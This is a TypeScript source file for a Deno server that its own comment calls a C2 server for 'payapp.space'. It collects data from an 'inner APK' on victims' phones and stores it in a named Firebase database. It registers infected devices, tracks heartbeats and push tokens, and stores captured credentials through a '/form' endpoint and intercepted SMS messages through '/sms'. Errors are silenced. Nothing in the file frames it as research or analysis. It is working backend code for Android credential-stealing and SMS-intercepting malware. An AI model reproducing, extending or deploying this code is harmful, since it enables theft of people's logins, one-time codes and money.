// C2 server for payapp.space
// Receives data from inner APK → stores in Firebase RTDB

const RTDB = "https://kotha-5ba9e-default-rtdb.asia-southeast1.firebasedatabase.app";

async function db(path: string, data: unknown) {
  try {
    await fetch(`${RTDB}/${path}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  } catch (_) { /* silent */ }
}

async function dbPush(path: string, data: unknown) {
  try {
    await fetch(`${RTDB}/${path}.json`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  } catch (_) { /* silent */ }
}

Deno.serve(async (req: Request) => {
  const url  = new URL(req.url);
  const path = url.pathname;
  const ts   = new Date().toISOString();

  // Allow all origins (inner APK needs this)
  const headers = {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
  };

  if (req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers });
  }

  let body: Record<string, unknown> = {};
  try { body = await req.json(); } catch (_) { /* empty body ok */ }

  const deviceId: string = (body.device_id as string) || 
    req.headers.get("x-device-id") || "unknown";

  // POST /register — device first contact
  if (path === "/register") {
    const id = deviceId === "unknown"
      ? crypto.randomUUID().replace(/-/g,"").slice(0,16)
      : deviceId;
    await db(`devices/${id}`, {
      ...body,
      device_id: id,
      registeredAt: ts,
      online: true,
      lastSeen: ts,
    });
    return new Response(
      JSON.stringify({ status: "ok", device_id: id, build_api_key: id }),
      { headers }
    );
  }

  // POST /ping  POST /heartbeat — keep-alive
  if (path === "/ping" || path === "/heartbeat") {
    await db(`devices/${deviceId}/status`, {
      online: true,
      lastSeen: ts,
      status: body.status ?? "online",
      timestamp: body.timestamp ?? ts,
    });
    return new Response(
      JSON.stringify({ status: "ok", commands: [] }),
      { headers }
    );
  }

  // POST /fcm/token — update FCM token
  if (path === "/fcm/token") {
    await db(`devices/${deviceId}/fcm`, {
      token: body.fcm_token,
      key:   body.build_api_key,
      updatedAt: ts,
    });
    return new Response(JSON.stringify({ status: "ok" }), { headers });
  }

  // POST /form — credentials captured
  if (path === "/form") {
    await dbPush(`forms`, {
      deviceId,
      ...body,
      capturedAt: ts,
    });
    // Also store under device
    await dbPush(`devices/${deviceId}/forms`, {
      ...body,
      capturedAt: ts,
    });
    return new Response(JSON.stringify({ status: "ok" }), { headers });
  }

  // POST /sms — SMS data
  if (path === "/sms") {
    await dbPush(`devices/${deviceId}/sms`, {
      sender:  body.sender ?? body.address,
      body:    body.s ?? body.body,
      date:    body.date ?? ts,
      raw:     body,
      receivedAt: ts,
    });
    return new Response(JSON.stringify({ status: "ok", count: 0 }), { headers });
  }

  // Default — return ok for anything else
  return new Response(JSON.stringify({ status: "ok" }), { headers });
});
